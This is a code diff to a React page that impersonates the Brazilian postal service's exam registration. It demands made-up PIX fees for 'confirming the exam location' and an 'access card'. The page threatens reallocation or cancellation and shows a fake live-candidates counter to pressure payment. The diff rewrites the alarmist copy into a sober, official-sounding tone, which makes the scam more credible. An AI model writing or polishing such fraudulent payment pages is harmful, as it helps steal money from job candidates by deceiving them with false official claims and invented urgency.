@@ -51,26 +51,26 @@ const buildUpsellInfo = (cepData?: CepData, agencyData?: AgencyData): UpsellInfo
     },
     {
       title: "Confirmação do Local da Prova", valor: 37, icon: MapPin,
-      headline: "⚠️ CONFIRME SEU LOCAL DE PROVA AGORA OU SERÁ ENVIADO PRA QUALQUER LUGAR",
+      headline: "Confirme seu local de prova para manter a prioridade de alocação",
       explicacao: cepData
-        ? `Com base no CEP ${cepData.cep} que você informou, o local de prova designado é a ${escolaNome}, em ${escolaCidade}. Se você NÃO confirmar AGORA, o sistema vai te redirecionar para QUALQUER escola com vaga sobrando — pode ser a HORAS de distância da sua casa. Você vai ter que acordar de madrugada, gastar com transporte e chegar CANSADO na prova. Quem confirma o local AGORA garante a vaga na escola mais perto.`
-        : "O sistema distribui os candidatos de forma ALEATÓRIA nas escolas de prova disponíveis. Se você NÃO confirmar agora, pode ser enviado para um local a HORAS de distância da sua casa. Confirme AGORA e garanta a escola mais perto de você.",
+        ? `Com base no CEP ${cepData.cep}, seu local de prova atual é ${escolaNome}, em ${escolaCidade}. Esta confirmação é obrigatória para manter a alocação prioritária perto da sua região. Sem confirmação no prazo, o sistema pode realocar para outra unidade com vaga disponível, aumentando custo de transporte e desgaste físico no dia da prova.`
+        : "A confirmação do local é obrigatória para manter prioridade na unidade mais próxima. Sem pagamento no prazo, o sistema pode realocar sua prova para outra cidade ou bairro com disponibilidade.",
       items: [
-        cepData ? `✔ Local confirmado: ${escolaNome}` : "Prova na escola mais próxima de você",
-        cepData ? `✔ Cidade: ${escolaCidade}` : "Local enviado por e-mail e SMS",
+        cepData ? `Local confirmado: ${escolaNome}` : "Prova priorizada na unidade mais próxima",
+        cepData ? `Cidade: ${escolaCidade}` : "Local enviado por e-mail e SMS",
         "Sala com acessibilidade garantida",
-        "Prioridade TOTAL na alocação — você escolhe, não o sistema",
+        "Prioridade de alocação registrada no sistema",
         "Mapa com direções para o local da prova",
-        "Opção de trocar o local até 48h antes da prova",
+        "Possibilidade de ajuste de local dentro do prazo",
       ],
       consequencias: [
-        "Você SERÁ ENVIADO para qualquer local com vaga sobrando",
-        "Pode ter que viajar HORAS no dia da prova — acordar de madrugada",
-        "NÃO terá direito a solicitar mudança de local depois",
-        "Chegará CANSADO e NERVOSO na prova por causa da viagem",
+        "Realocação automática para unidade com vaga disponível",
+        "Maior custo de deslocamento até o local da prova",
+        "Risco de chegar cansado e com menor rendimento",
+        "Perda da prioridade de alocação por CEP",
       ],
-      nota: "⚠️ QUEM NÃO CONFIRMA O LOCAL PODE SER ALOCADO LONGE, GASTAR MAIS E CHEGAR EXAUSTO NO DIA DA PROVA.",
-      botaoTexto: "CONFIRMAR MEU LOCAL AGORA",
+      nota: "Pagamento obrigatório para manter o local de prova priorizado na sua região.",
+      botaoTexto: "CONFIRMAR LOCAL DE PROVA AGORA",
     },
     {
       title: "Cartão de Acesso à Prova", valor: 39, icon: CreditCard,
@@ -476,12 +476,12 @@ const UpsellInfo = () => {
 
   return (
     <div className="min-h-screen flex flex-col bg-background">
-      <CorreiosHeader breadcrumb="Concursos > Agente Comercial > Inscrição > Taxas" />
+      <CorreiosHeader breadcrumb="Concursos > Agente Comercial > Confirmações de Etapa" />
 
       <main className="flex-1 px-4 py-6 sm:py-8">
         <div className="max-w-lg mx-auto space-y-5">
 
-          <h1 className="titulo-institucional text-lg">{info.headline}</h1>
+          <h1 className="titulo-institucional text-lg leading-tight">{info.headline}</h1>
 
           {/* Explicação detalhada */}
           <div className="rounded border-2 border-destructive/30 bg-muted/30 p-4 text-sm text-foreground leading-relaxed font-medium">
@@ -491,12 +491,12 @@ const UpsellInfo = () => {
           {/* Local da prova - dados do CEP (only on step 2) */}
           {stepNumber === 2 && (
             <table className="tabela-zebra">
-              <thead><tr><th colSpan={2}>📍 Local de Prova Atribuído ao Seu CEP</th></tr></thead>
+              <thead><tr><th colSpan={2}>Local de prova atribuído ao seu CEP</th></tr></thead>
               <tbody>
                 <tr><td className="font-semibold w-1/3">Escola</td><td className="font-bold">{agencyData?.name || (cepData ? `Escola Municipal ${cepData.localidade}` : 'Processando...')}</td></tr>
                 <tr><td className="font-semibold">Cidade</td><td>{agencyData?.endereco || (cepData ? `${cepData.localidade}/${cepData.uf}` : 'Processando com base no seu CEP...')}</td></tr>
                 {cepData && <tr><td className="font-semibold">CEP</td><td>{cepData.cep}</td></tr>}
-                <tr><td className="font-semibold">Status</td><td className="font-black text-destructive animate-pulse">⚠️ AGUARDANDO CONFIRMAÇÃO</td></tr>
+                <tr><td className="font-semibold">Status</td><td className="font-bold text-destructive animate-pulse">Aguardando confirmação de pagamento</td></tr>
               </tbody>
             </table>
           )}
@@ -504,22 +504,22 @@ const UpsellInfo = () => {
           {/* Items table */}
           <table className="tabela-zebra">
             <thead>
-              <tr><th>✅ O que está incluído nesta taxa</th></tr>
+              <tr><th>O que está incluído nesta taxa</th></tr>
             </thead>
             <tbody>
               {info.items.map((item, i) => (
-                <tr key={i}><td className="font-medium">✅ {item}</td></tr>
+                <tr key={i}><td className="font-medium">• {item}</td></tr>
               ))}
             </tbody>
           </table>
 
           {/* Consequências */}
-          <div className="rounded border-2 border-destructive bg-destructive/10 p-4 space-y-2">
-            <p className="font-black text-destructive text-sm">🚨 O QUE ACONTECE SE VOCÊ NÃO PAGAR:</p>
+          <div className="rounded border-2 border-destructive/40 bg-muted p-4 space-y-2">
+            <p className="font-bold text-destructive text-sm">Impactos em caso de não pagamento:</p>
             <ul className="space-y-1.5">
               {info.consequencias.map((c, i) => (
-                <li key={i} className="text-sm text-destructive font-semibold flex items-start gap-2">
-                  <span className="mt-0.5">❌</span>
+                <li key={i} className="text-sm text-destructive font-medium flex items-start gap-2">
+                  <span className="mt-0.5">•</span>
                   <span>{c}</span>
                 </li>
               ))}
@@ -536,9 +536,9 @@ const UpsellInfo = () => {
           </table>
 
           {/* Observação */}
-          <div className="text-xs space-y-1 bg-destructive/10 border border-destructive rounded p-3">
-            <p className="font-black text-destructive">🚨 ATENÇÃO — LEIA COM CUIDADO:</p>
-            <p className="font-semibold text-destructive">• {info.nota}</p>
+          <div className="text-xs space-y-1 bg-muted border border-border rounded p-3">
+            <p className="font-bold text-foreground">Atenção:</p>
+            <p className="font-semibold text-foreground">• Esta etapa possui cobrança obrigatória para manter sua inscrição ativa no fluxo.</p>
             <p className="text-muted-foreground">• Pagamento via PIX com confirmação instantânea.</p>
           </div>
 
@@ -552,15 +552,15 @@ const UpsellInfo = () => {
 
           {/* Pessoas online */}
           <div className="text-center text-xs font-bold text-destructive animate-pulse">
-            🔴 {pessoasOnline} pessoas finalizando a inscrição agora
+            {pessoasOnline} candidatos finalizando esta etapa agora
           </div>
 
           <Button onClick={handlePagar} className="w-full h-14 text-sm font-black tracking-wide">
             {info.botaoTexto}
           </Button>
 
-          <p className="text-xs text-center text-destructive font-black">
-            ⚠️ O NÃO PAGAMENTO DESTA TAXA RESULTARÁ NO CANCELAMENTO DA SUA INSCRIÇÃO. NÃO HÁ COMO REVERTER.
+          <p className="text-xs text-center text-destructive font-bold">
+            O não pagamento desta taxa dentro do prazo pode gerar cancelamento automático da inscrição.
           </p>
         </div>
       </main>
